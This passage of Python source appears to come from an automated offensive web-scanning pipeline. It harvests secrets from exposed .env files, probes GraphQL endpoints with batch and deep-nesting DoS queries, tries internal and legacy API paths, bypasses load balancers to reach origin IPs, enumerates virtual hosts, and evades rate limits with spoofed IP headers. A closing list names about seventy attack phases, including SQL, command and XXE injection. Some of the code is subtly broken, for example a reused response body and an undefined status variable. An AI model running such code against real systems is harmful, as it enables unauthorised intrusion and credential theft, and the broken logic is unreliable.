                if status == 200:
                    body_str = body_bytes.decode("utf-8", errors="replace")
                    found_secrets = []
                    for pattern, stype in secret_patterns:
                        for m in pattern.finditer(body_str):
                            val = m.group(2) if m.lastindex and m.lastindex >= 2 else m.group()
                            found_secrets.append(f"{stype}:{val[:40]}")
                    findings.append(f"[env-file] {host} path={path} type={env_type_map.get(path, 'unknown')} secrets={','.join(found_secrets) if found_secrets else 'none'}")
            except Exception:
                pass
        await _throttle_rate()
    if not findings:
        findings.append("[env-file] No findings (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"131-ENVDEEP: {len(findings)} findings \u2192 {out}")
    return {"131-ENVDEEP": str(out), "count": len(findings)}



async def phase_132_GQLABUSE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"132-GQLABUSE"}:
        return {}
    _out = outdir / "graphql_abuse.txt"
    if _out.exists() and not force:
        return {"132-GQLABUSE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 132-GQLABUSE: GraphQL batching & DoS testing")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()

    introspection_file = outdir / "graphql_introspection.txt"
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []

    gql_endpoints = []
    if introspection_file.exists():
        for line in read_lines(introspection_file):
            line = line.strip()
            if not line:
                continue
            if line.lower().startswith("http"):
                gql_endpoints.append(line.split()[0])
    if not gql_endpoints:
        for h in hosts:
            h = h.strip()
            if not h:
                continue
            gql_endpoints.append(f"https://{h}/graphql")
            gql_endpoints.append(f"http://{h}/graphql")

    if not gql_endpoints:
        log("warn", "132-GQLABUSE: no GraphQL endpoints found; skipping")
        return {"132-GQLABUSE": str(_out), "count": 0}

    sample = int(getattr(_PIPELINE_CFG, "sample_hosts_gqlabuse", 10))
    gql_endpoints = gql_endpoints[:sample]

    depth10 = "{ user { friends { friends { friends { friends { __typename } } } } } }"

    for ep in gql_endpoints:
        await _throttle_rate()
        # Test 1: Batched queries — POST with array of 50 queries
        try:
            batch_payload = json.dumps([{"query": "{__typename}"}] * 50).encode("utf-8")
            req = urllib.request.Request(
                ep,
                data=batch_payload,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    **_extra_h,
                },
                method="POST",
            )
            status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=12)
            body = body_bytes.decode("utf-8", errors="replace")
            if status == 200:
                try:
                    parsed = json.loads(body)
                    if isinstance(parsed, list):
                        count = len(parsed)
                    else:
                        count = 1
                    if count > 1:
                        findings.append(f"[gql-batch] {ep} count={count} accepted")
                except (json.JSONDecodeError, ValueError):
                    pass
        except (urllib.error.URLError, urllib.error.HTTPError, OSError, socket.timeout):
            pass
        except Exception:
            pass

        # Test 2: Query depth DoS — deeply nested query
        try:
            depth_payload = json.dumps({"query": depth10}).encode("utf-8")
            req = urllib.request.Request(
                ep,
                data=depth_payload,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    **_extra_h,
                },
                method="POST",
            )
            status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=12)
            body = body_bytes.decode("utf-8", errors="replace")
            if status == 200 and body:
                try:
                    parsed = json.loads(body)
                    if "data" in parsed or "errors" not in parsed:
                        findings.append(f"[gql-depth-attack] {ep} depth=10 accepted")
                except (json.JSONDecodeError, ValueError):
                    pass
        except (urllib.error.URLError, urllib.error.HTTPError, OSError, socket.timeout):
            pass
        except Exception:
            pass

        # Test 3: Introspection disabled but schema leaked via error messages
        try:
            introspect_payload = json.dumps({"query": "{__schema{types{name,fields{name}}}}"}).encode("utf-8")
            req = urllib.request.Request(
                ep,
                data=introspect_payload,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    **_extra_h,
                },
                method="POST",
            )
            status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=12)
            body = body_bytes.decode("utf-8", errors="replace")
            if body:
                schema_keywords = ["type", "field", "query", "mutation", "subscription", "schema"]
                body_lower = body.lower()
                leak_found = False
                for kw in schema_keywords:
                    if kw in body_lower and ("introspection" in body_lower or "disabled" in body_lower or "not allowed" in body_lower):
                        detail = body[:200].replace("\n", " ")
                        findings.append(f"[gql-schema-leak] {ep} detail={detail}")
                        leak_found = True
                        break
        except (urllib.error.URLError, urllib.error.HTTPError, OSError, socket.timeout):
            pass
        except Exception:
            pass

        # Test 4: Field suggestions leaking schema info
        try:
            typo_payload = json.dumps({"query": "{ uzer { naem } }"}).encode("utf-8")
            req = urllib.request.Request(
                ep,
                data=typo_payload,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    **_extra_h,
                },
                method="POST",
            )
            resp = await _async_urlopen(_urlopen, req, timeout=12)
            body = body_bytes.decode("utf-8", errors="replace")
            if body:
                suggest_match = re.search(r'suggest[^\"]*\"([^\"]+)\"', body, re.IGNORECASE)
                if suggest_match:
                    detail = suggest_match.group(0)[:200]
                    findings.append(f"[gql-schema-leak] {ep} detail={detail}")
        except (urllib.error.URLError, urllib.error.HTTPError, OSError, socket.timeout):
            pass
        except Exception:
            pass

    if not findings:
        findings.append("[tag] No findings (expected)")

    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"132-GQLABUSE: {len(findings)} findings → {out}")
    return {"132-GQLABUSE": str(out), "count": len(findings)}


async def phase_133_APIVERSION(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"133-APIVERSION"}:
        return {}
    _out = outdir / "api_version_bypass.txt"
    if _out.exists() and not force:
        return {"133-APIVERSION": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 133-APIVERSION: API versioning bypass testing")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()

    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []

    api_urls = [u.strip() for u in all_urls if u.strip() and "/api/" in u.lower()]

    if not api_urls:
        log("warn", "133-APIVERSION: no /api/ URLs found; skipping")
        return {"133-APIVERSION": str(_out), "count": 0}

    sample = int(getattr(_PIPELINE_CFG, "sample_urls_apiversion", 20))
    api_urls = api_urls[:sample]

    version_swaps = [
        (r'(/api/)v\d+(.*)', r'\1v0\2'),
        (r'(/api/)v\d+(.*)', r'\1internal\2'),
        (r'(/api/)v\d+(.*)', r'\1legacy\2'),
        (r'(/api/)v\d+(.*)', r'\1beta\2'),
    ]
    version_patterns = [
        (r'(/?)v\d+(/.*)', r'\1v0\2'),
        (r'(/?)v\d+(/.*)', r'\1api\2'),
    ]

    for url in api_urls:
        await _throttle_rate()
        parsed = urllib.parse.urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path
        qs = parsed.query

        variants = []

        for pat, repl in version_swaps:
            new_path = re.sub(pat, repl, path, count=1)
            if new_path != path:
                variants.append(("old_version", new_path))

        for pat, repl in version_patterns:
            new_path = re.sub(pat, repl, path, count=1)
            if new_path != path:
                variants.append(("old_version", new_path))

        no_version = re.sub(r'/v\d+', '', path, count=1)
        if no_version != path:
            variants.append(("no_version", no_version))

        path_parts = path.split("/")
        for i, part in enumerate(path_parts):
            if re.match(r'^v\d+$', part):
                for older in ["v0", "v1", "v2"]:
                    if older != part:
                        new_parts = path_parts[:]
                        new_parts[i] = older
                        variants.append(("older_version", "/".join(new_parts)))
                break

        for tag, variant_path in variants:
            await _throttle_rate()
            variant_url = base + variant_path
            if qs:
                variant_url += "?" + qs
            try:
                req = urllib.request.Request(variant_url, headers={"Accept": "*/*", **_extra_h}, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=12)
                if status == 200:
                    findings.append(f"[api-version-bypass] {url} {tag}={variant_path} status={status}")
            except urllib.error.HTTPError as e:
                pass
            except (urllib.error.URLError, OSError, socket.timeout):
                pass
            except Exception:
                pass

        # Test /api/internal/ path
        internal_path = re.sub(r'(/api/)v\d+', r'\1internal', path, count=1)
        if internal_path != path:
            await _throttle_rate()
            internal_url = base + internal_path
            if qs:
                internal_url += "?" + qs
            try:
                req = urllib.request.Request(internal_url, headers={"Accept": "*/*", **_extra_h}, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=12)
                if status == 200:
                    findings.append(f"[api-internal] {url} path={internal_path}")
            except urllib.error.HTTPError:
                pass
            except (urllib.error.URLError, OSError, socket.timeout):
                pass
            except Exception:
                pass

    if not findings:
        findings.append("[tag] No findings (expected)")

    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"133-APIVERSION: {len(findings)} findings → {out}")
    return {"133-APIVERSION": str(out), "count": len(findings)}


async def phase_134_LBDETECT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"134-LBDETECT"}:
        return {}
    _out = outdir / "load_balancer_bypass.txt"
    if _out.exists() and not force:
        return {"134-LBDETECT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 134-LBDETECT: load balancer detection & bypass")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()

    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []

    if not hosts:
        log("warn", "134-LBDETECT: no hosts; skipping")
        return {"134-LBDETECT": str(_out), "count": 0}

    sample = int(getattr(_PIPELINE_CFG, "sample_hosts_lbdetect", 15))
    hosts = hosts[:sample]

    lb_signatures = {
        "AWS_ALB": ["x-amzn-trace-id", "x-amzn-requestid", "x-amz-cf-id", "x-forwarded-by"],
        "CloudFront": ["x-amz-cf-id", "x-cache", "via"],
        "Cloudflare": ["cf-ray", "cf-cache-status", "server"],
        "F5_BIGIP": ["x-wa-info", "x-bigip", "server"],
        "HAProxy": ["x-ha-proxy", "x-haproxy", "server"],
        "Akamai": ["x-akamai-transformed", "x-akamai-request-id", "server"],
        "Fastly": ["x-served-by", "x-cache", "x-fastly-request-id"],
        "Envoy": ["x-envoy-upstream-service-time", "x-envoy-decorator-operation"],
    }

    origin_file = outdir / "origin.txt"
    origin_ips = read_lines(origin_file) if origin_file.exists() else []

    for host in hosts:
        host = host.strip()
        if not host:
            continue

        await _throttle_rate()
        url = f"https://{host}/"
        try:
            req = urllib.request.Request(url, headers={"Accept": "*/*", **_extra_h}, method="GET")
            status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=12)
            headers = {k.lower(): v for k, v in resp_headers.items()}
            body = body_bytes.decode("utf-8", errors="replace")

            detected_lb = None
            for lb_type, sig_headers in lb_signatures.items():
                for sh in sig_headers:
                    if sh.lower() in headers:
                        detected_lb = lb_type
                        break
                if detected_lb:
                    break

            if detected_lb:
                findings.append(f"[lb-detected] {host} type={detected_lb}")

                origin_ip = None
                for oip in origin_ips:
                    oip = oip.strip()
                    if oip:
                        origin_ip = oip
                        break

                if origin_ip:
                    await _throttle_rate()
                    origin_url = f"https://{origin_ip}/"
                    try:
                        oreq = urllib.request.Request(
                            origin_url,
                            headers={"Host": host, "Accept": "*/*", **_extra_h},
                            method="GET",
                        )
                        _, _, oresp_body = await _async_urlopen(_urlopen, oreq, timeout=12)
                        obody = oresp_body.decode("utf-8", errors="replace")
                        diff = "YES" if obody.strip() != body.strip() else "NO"
                        findings.append(f"[lb-bypass] {host} origin={origin_ip} diff={diff}")
                    except (urllib.error.URLError, urllib.error.HTTPError, OSError, socket.timeout):
                        findings.append(f"[lb-bypass] {host} origin={origin_ip} diff=UNREACHABLE")
                    except Exception:
                        pass

        except urllib.error.HTTPError as e:
            detected_lb = None
            hdrs = {}
            if hasattr(e, "headers") and e.headers:
                for key, val in e.headers.items():
                    hdrs[key.lower()] = val
            for lb_type, sig_headers in lb_signatures.items():
                for sh in sig_headers:
                    if sh.lower() in hdrs:
                        detected_lb = lb_type
                        break
                if detected_lb:
                    break
            if detected_lb:
                findings.append(f"[lb-detected] {host} type={detected_lb}")
        except (urllib.error.URLError, OSError, socket.timeout):
            pass
        except Exception:
            pass

    if not findings:
        findings.append("[tag] No findings (expected)")

    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"134-LBDETECT: {len(findings)} findings → {out}")
    return {"134-LBDETECT": str(out), "count": len(findings)}


async def phase_135_VHOST(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"135-VHOST"}:
        return {}
    _out = outdir / "vhost_discovery.txt"
    if _out.exists() and not force:
        return {"135-VHOST": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 135-VHOST: virtual host enumeration")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()

    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []

    if not hosts:
        log("warn", "135-VHOST: no hosts; skipping")
        return {"135-VHOST": str(_out), "count": 0}

    sample = int(getattr(_PIPELINE_CFG, "sample_hosts_vhost", 10))
    hosts = hosts[:sample]

    for host in hosts:
        host = host.strip()
        if not host:
            continue

        await _throttle_rate()
        # Extract IP if possible (for reporting), else use hostname
        ip = host
        try:
            ip = socket.gethostbyname(host)
        except (socket.gaierror, OSError):
            pass

        target_domain = host
        if "." in host:
            parts = host.split(".")
            if len(parts) >= 2:
                target_domain = ".".join(parts[-2:])

        host_headers_to_try = [
            target_domain,
            f"admin.{target_domain}",
            f"mail.{target_domain}",
            f"internal.{target_domain}",
            f"staging.{target_domain}",
            f"dev.{target_domain}",
            f"api.{target_domain}",
            f"test.{target_domain}",
        ]

        baseline_status = None
        baseline_len = None
        baseline_title = None
        results = []

        for i, hh in enumerate(host_headers_to_try):
            await _throttle_rate()
            url = f"https://{host}/"
            try:
                req = urllib.request.Request(
                    url,
                    headers={"Host": hh, "Accept": "*/*", **_extra_h},
                    method="GET",
                )
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=12)
                body = body_bytes.decode("utf-8", errors="replace")
                content_len = len(body)

                title_match = re.search(r'<title[^>]*>([^<]*)</title>', body, re.IGNORECASE | re.DOTALL)
                title = title_match.group(1).strip()[:80] if title_match else ""

                if i == 0:
                    baseline_status = status
                    baseline_len = content_len
                    baseline_title = title

                results.append((hh, status, content_len, title))

            except urllib.error.HTTPError as e:
                status = e.code
                title = ""
                content_len = 0
                if i == 0:
                    baseline_status = status
                    baseline_len = content_len
                    baseline_title = title
                results.append((hh, status, content_len, title))
            except (urllib.error.URLError, OSError, socket.timeout):
                if i == 0:
                    baseline_status = 0
                    baseline_len = 0
                    baseline_title = ""
                results.append((hh, 0, 0, ""))
            except Exception:
                if i == 0:
                    baseline_status = 0
                    baseline_len = 0
                    baseline_title = ""
                results.append((hh, 0, 0, ""))

        for hh, status, content_len, title in results[1:]:
            if status == 0:
                continue
            len_diff = abs(content_len - (baseline_len or 0)) if baseline_len else content_len
            title_diff = title != baseline_title if baseline_title else bool(title)
            status_diff = status != baseline_status if baseline_status else True

            if status_diff or len_diff > 100 or title_diff:
                findings.append(f"[vhost-found] {ip} host={hh} status={status} len={content_len} title={title}")

    if not findings:
        findings.append("[tag] No findings (expected)")

    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"135-VHOST: {len(findings)} findings → {out}")
    return {"135-VHOST": str(out), "count": len(findings)}


async def phase_136_RATELIMITBYPASS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"136-RATELIMITBYPASS"}:
        return {}
    _out = outdir / "rate_limit_bypass.txt"
    if _out.exists() and not force:
        return {"136-RATELIMITBYPASS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 136-RATELIMITBYPASS: application rate limit bypass")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()

    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []

    if not all_urls:
        log("warn", "136-RATELIMITBYPASS: no URLs found; skipping")
        return {"136-RATELIMITBYPASS": str(_out), "count": 0}

    sample = int(getattr(_PIPELINE_CFG, "sample_urls_ratelimitbypass", 20))
    urls = [u.strip() for u in all_urls if u.strip()][:sample]

    ip_rotation_headers = [
        ("X-Forwarded-For", [f"10.0.{i}.{j}" for i in range(1, 5) for j in range(1, 255, 50)]),
        ("X-Real-IP", [f"172.16.{i}.{j}" for i in range(1, 5) for j in range(1, 255, 50)]),
        ("X-Originating-IP", [f"192.168.{i}.{j}" for i in range(1, 5) for j in range(1, 255, 50)]),
        ("CF-Connecting-IP", [f"104.28.{i}.{j}" for i in range(1, 5) for j in range(1, 255, 50)]),
        ("X-Forwarded-Host", [f"10.0.{i}.{j}" for i in range(1, 5) for j in range(1, 255, 50)]),
    ]

    case_transforms = [
        lambda p: p.upper(),
        lambda p: re.sub(r'[a-z]', lambda m: m.group(0).upper(), p),
        lambda p: "".join(c.upper() if i % 2 == 0 else c for i, c in enumerate(p)),
    ]

    unicode_swaps = [
        (".", "．"),
        ("-", "﹘"),
        ("/", "∕"),
    ]

    for url in urls:
        parsed = urllib.parse.urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path
        qs = parsed.query

        # Baseline request to check if rate limiting exists
        baseline_status = None
        try:
            req = urllib.request.Request(url, headers={"Accept": "*/*", **_extra_h}, method="GET")
            resp = await _async_urlopen(_urlopen, req, timeout=12)
            baseline_status = status  # already unpacked
        except urllib.error.HTTPError as e:
            baseline_status = e.code
        except (urllib.error.URLError, OSError, socket.timeout):
            continue
        except Exception:
            continue

        if baseline_status != 429 and baseline_status != 403:
            # Still try a few quick checks for URLs that might be rate-limited
            pass

        # Technique 1: X-Forwarded-For rotation with fake IPs
        for hdr_name, ip_list in ip_rotation_headers:
            await _throttle_rate()
            fake_ip = ip_list[0] if ip_list else "1.2.3.4"
            try:
                headers = {"Accept": "*/*", hdr_name: fake_ip, **_extra_h}
                req = urllib.request.Request(url, headers=headers, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=12)
                if status == 200 and baseline_status in (429, 403):
                    findings.append(f"[ratelimit-bypass] {url} method={hdr_name}:{fake_ip} status={status}")
                    break
            except urllib.error.HTTPError as e:
                if e.code == 200 and baseline_status in (429, 403):
                    findings.append(f"[ratelimit-bypass] {url} method={hdr_name}:{fake_ip} status={e.code}")
                    break
            except (urllib.error.URLError, OSError, socket.timeout):
                pass
            except Exception:
                pass

        # Technique 2: Different HTTP methods
        for method in ["GET", "POST", "PUT", "PATCH", "OPTIONS"]:
            await _throttle_rate()
            try:
                req = urllib.request.Request(url, headers={"Accept": "*/*", **_extra_h}, method=method)
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=12)
                if status == 200 and baseline_status in (429, 403):
                    findings.append(f"[ratelimit-bypass] {url} method=HTTP_{method} status={status}")
                    break
            except urllib.error.HTTPError as e:
                if e.code == 200 and baseline_status in (429, 403):
                    findings.append(f"[ratelimit-bypass] {url} method=HTTP_{method} status={e.code}")
                    break
            except (urllib.error.URLError, OSError, socket.timeout):
                pass
            except Exception:
                pass

        # Technique 3: Random query params
        await _throttle_rate()
        timestamp = int(__import__("time").time())
        variant_qs = f"_={timestamp}"
        if qs:
            variant_qs = f"{qs}&_={timestamp}"
        variant_url = f"{base}{path}?{variant_qs}"
        try:
            req = urllib.request.Request(variant_url, headers={"Accept": "*/*", **_extra_h}, method="GET")
            status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=12)
            if status == 200 and baseline_status in (429, 403):
                findings.append(f"[ratelimit-bypass] {url} method=RANDOM_PARAM status={status}")
        except urllib.error.HTTPError as e:
            if e.code == 200 and baseline_status in (429, 403):
                findings.append(f"[ratelimit-bypass] {url} method=RANDOM_PARAM status={e.code}")
        except (urllib.error.URLError, OSError, socket.timeout):
            pass
        except Exception:
            pass

        # Technique 4: Case variation in URL path
        for transform in case_transforms:
            await _throttle_rate()
            new_path = transform(path)
            if new_path == path:
                continue
            variant_url = f"{base}{new_path}"
            if qs:
                variant_url += "?" + qs
            try:
                req = urllib.request.Request(variant_url, headers={"Accept": "*/*", **_extra_h}, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=12)
                if status == 200 and baseline_status in (429, 403):
                    findings.append(f"[ratelimit-bypass] {url} method=CASE_VARIATION status={status}")
                    break
            except urllib.error.HTTPError as e:
                if e.code == 200 and baseline_status in (429, 403):
                    findings.append(f"[ratelimit-bypass] {url} method=CASE_VARIATION status={e.code}")
                    break
            except (urllib.error.URLError, OSError, socket.timeout):
                pass
            except Exception:
                pass

        # Technique 5: Unicode/special chars in path
        await _throttle_rate()
        unicode_path = path
        for orig, repl in unicode_swaps:
            unicode_path = unicode_path.replace(orig, repl)
        if unicode_path != path:
            variant_url = f"{base}{unicode_path}"
            if qs:
                variant_url += "?" + qs
            try:
                req = urllib.request.Request(variant_url, headers={"Accept": "*/*", **_extra_h}, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=12)
                if status == 200 and baseline_status in (429, 403):
                    findings.append(f"[ratelimit-bypass] {url} method=UNICODE_PATH status={status}")
            except urllib.error.HTTPError as e:
                if e.code == 200 and baseline_status in (429, 403):
                    findings.append(f"[ratelimit-bypass] {url} method=UNICODE_PATH status={e.code}")
            except (urllib.error.URLError, OSError, socket.timeout):
                pass
            except Exception:
                pass

    if not findings:
        findings.append("[tag] No findings (expected)")

    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"136-RATELIMITBYPASS: {len(findings)} findings → {out}")
    return {"136-RATELIMITBYPASS": str(out), "count": len(findings)}


PIPELINE = [
    ("00-SCOPE", phase_00_SCOPE, ("domain", "outdir", "t", "only", "skip", "force")),
    ("01-RECON", phase_01_RECON, ("domain", "outdir", "t", "only", "skip", "resume", "force")),
    ("02-RESOLVE", phase_02_RESOLVE, ("domain", "outdir", "t", "only", "skip", "prev", "resume", "force")),
    ("03-PERMUTE", phase_03_PERMUTE, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
    ("04-SCAN", phase_04_SCAN, ("outdir", "t", "only", "skip", "prev", "force")),
    ("04b-TAKEOVER-VALIDATE", phase_04b_TAKEOVER_VALIDATE, ("outdir", "t", "only", "skip", "force")),
    ("05-HARVEST", phase_05_HARVEST, ("outdir", "t", "only", "skip", "prev", "force")),
    ("05b-APISPEC", phase_05b_APISPEC, ("outdir", "t", "only", "skip", "prev", "force")),
    ("06-JSINTEL", phase_06_JSINTEL, ("outdir", "t", "only", "skip", "force")),
    ("07-PARAMS", phase_07_PARAMS, ("outdir", "t", "only", "skip", "prev", "force")),
    ("08-FUZZ", phase_08_FUZZ, ("outdir", "t", "only", "skip", "force")),
    ("09-VULNSCAN", phase_09_VULNSCAN, ("outdir", "t", "only", "skip", "force")),
    ("10-TLSCMS", phase_10_TLSCMS, ("outdir", "t", "only", "skip", "force")),
    ("11-INJECT", phase_11_INJECT, ("outdir", "t", "only", "skip", "oast_domain", "force")),
    ("11a-DOMXSS", phase_11a_DOMXSS, ("outdir", "t", "only", "skip", "prev", "force")),
    ("11b-SQLMAP", phase_11b_SQLMAP, ("outdir", "t", "only", "skip", "prev", "force")),
    ("12-SSTI", phase_12_SSTI, ("outdir", "t", "only", "skip", "prev", "force")),
    ("13-OOB", phase_13_OOB, ("outdir", "t", "only", "skip", "oast", "force")),
    ("14-ORIGIN", phase_14_ORIGIN, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
    ("15-SECRETS", phase_15_SECRETS, ("outdir", "t", "only", "skip", "force")),
    ("16a-AUTHZ", phase_16a_AUTHZ, ("outdir", "t", "only", "skip", "force")),
    ("16b-MASSASSIGN", phase_16b_MASSASSIGN, ("outdir", "t", "only", "skip", "force")),
    ("17-IDOR", phase_17_IDOR, ("outdir", "t", "only", "skip", "prev", "force")),
    ("17b-SSRFMETA", phase_17b_SSRFMETA, ("outdir", "t", "only", "skip", "prev", "force")),
    ("18-CLOUD", phase_18_CLOUD, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
    ("19-GIT", phase_19_GIT, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
    ("20-GRAPHQL", phase_20_GRAPHQL, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
    ("21-WAF", phase_21_WAF, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
    ("21b-WAFBYPASS", phase_21b_WAFBYPASS, ("outdir", "t", "only", "skip", "prev", "force")),
    ("22-NOSQLI", phase_22_NOSQLI, ("outdir", "t", "only", "skip", "prev", "force")),
    ("23-RACE", phase_23_RACE, ("outdir", "t", "only", "skip", "prev", "force")),
    ("24-JWT", phase_24_JWT, ("outdir", "t", "only", "skip", "force")),
    ("25-XXE", phase_25_XXE, ("outdir", "t", "only", "skip", "prev", "oast_domain", "force")),
    ("26-CMDINJECT", phase_26_CMDINJECT, ("outdir", "t", "only", "skip", "prev", "force")),
    ("27-SSPP", phase_27_SSPP, ("outdir", "t", "only", "skip", "prev", "force")),
    ("28-CACHED", phase_28_CACHED, ("outdir", "t", "only", "skip", "prev", "force")),
    ("29-DEPCHECK", phase_29_DEPCHECK, ("outdir", "t", "only", "skip", "force")),
    ("30-LFI", phase_30_LFI, ("outdir", "t", "only", "skip", "prev", "force")),
    ("31-OPENREDIR", phase_31_OPENREDIR, ("outdir", "t", "only", "skip", "prev", "force")),
    ("32-CLICKJACK", phase_32_CLICKJACK, ("outdir", "t", "only", "skip", "prev", "force")),
    ("33-CRLF", phase_33_CRLF, ("outdir", "t", "only", "skip", "prev", "force")),
    ("34-RATELIMIT", phase_34_RATELIMIT, ("outdir", "t", "only", "skip", "prev", "force")),
    ("35-CORSADV", phase_35_CORSADV, ("outdir", "t", "only", "skip", "prev", "force")),
    ("36-JWTADV", phase_36_JWTADV, ("outdir", "t", "only", "skip", "prev", "force")),
    ("37-FILEUPLOAD", phase_37_FILEUPLOAD, ("outdir", "t", "only", "skip", "prev", "force")),
    ("38-SMUGGLE", phase_38_SMUGGLE, ("outdir", "t", "only", "skip", "prev", "force")),
    ("38b-H2SMUGGLE", phase_38b_H2SMUGGLE, ("outdir", "t", "only", "skip", "prev", "force")),
    ("39-OAUTH", phase_39_OAUTH, ("outdir", "t", "only", "skip", "prev", "force")),
    ("40-PWRESET", phase_40_PWRESET, ("outdir", "t", "only", "skip", "prev", "force")),
    ("41-WEBSOCKET", phase_41_WEBSOCKET, ("outdir", "t", "only", "skip", "prev", "force")),
    ("42-LDAP", phase_42_LDAP, ("outdir", "t", "only", "skip", "prev", "force")),
    ("43-DESERIAL", phase_43_DESERIAL, ("outdir", "t", "only", "skip", "prev", "force")),
    ("44-CHAIN", phase_44_CHAIN, ("outdir", "t", "only", "skip", "prev", "force")),
    ("45-EVIDENCE", phase_45_EVIDENCE, ("outdir", "t", "only", "skip", "prev", "force")),
    ("46-BUCKET", phase_46_BUCKET, ("outdir", "t", "only", "skip", "prev", "force")),
    ("47-CDN", phase_47_CDN, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
    ("48-CONTENT", phase_48_CONTENT, ("outdir", "t", "only", "skip", "prev", "force")),
    ("49-FRAMEWORKS", phase_49_FRAMEWORKS, ("outdir", "t", "only", "skip", "prev", "force")),
    ("50-BUCKET-PERMS", phase_50_BUCKET_PERMS, ("outdir", "t", "only", "skip", "force")),
    ("51-HPP", phase_51_HPP, ("outdir", "t", "only", "skip", "prev", "force")),
    ("52-SERVERLESS", phase_52_SERVERLESS, ("outdir", "t", "only", "skip", "force")),
    ("53-CSP", phase_53_CSP, ("outdir", "t", "only", "skip", "force")),
    ("54-WS-FUZZ", phase_54_WS_FUZZ, ("outdir", "t", "only", "skip", "prev", "force")),
    ("55-CSV-INJECT", phase_55_CSV_INJECT, ("outdir", "t", "only", "skip", "prev", "force")),
    ("56-EXPOSED-DB", phase_56_EXPOSED_DB, ("outdir", "t", "only", "skip", "prev", "force")),
    ("57-DEFAULT-CREDS", phase_57_DEFAULT_CREDS, ("outdir", "t", "only", "skip", "prev", "force")),
    ("58-HOST-INJECT", phase_58_HOST_INJECT, ("outdir", "t", "only", "skip", "prev", "force")),
    ("59-EMAIL-SEC", phase_59_EMAIL_SEC, ("domain", "outdir", "t", "only", "skip", "force")),
    ("60-SMTP-ENUM", phase_60_SMTP_ENUM, ("domain", "outdir", "t", "only", "skip", "force")),
    ("61-OAUTH-ADV", phase_61_OAUTH_ADV, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
    ("62-LOG-INJECT", phase_62_LOG_INJECT, ("outdir", "t", "only", "skip", "prev", "force")),
    ("63-DOC-ATTACK", phase_63_DOC_ATTACK, ("outdir", "t", "only", "skip", "prev", "force")),
    ("64-IDEMPOTENCY", phase_64_IDEMPOTENCY, ("outdir", "t", "only", "skip", "prev", "force")),
    ("65-SESSION", phase_65_SESSION, ("outdir", "t", "only", "skip", "prev", "force")),
    ("66-SSRF-FULL", phase_66_SSRF_FULL, ("outdir", "t", "only", "skip", "prev", "oast_domain", "force")),
    ("67-PATHNORM", phase_67_PATHNORM, ("outdir", "t", "only", "skip", "prev", "force")),
    ("68-DEPCVE", phase_68_DEPCVE, ("outdir", "t", "only", "skip", "force")),
    ("69-DNSZT", phase_69_DNSZT, ("domain", "outdir", "t", "only", "skip", "force")),
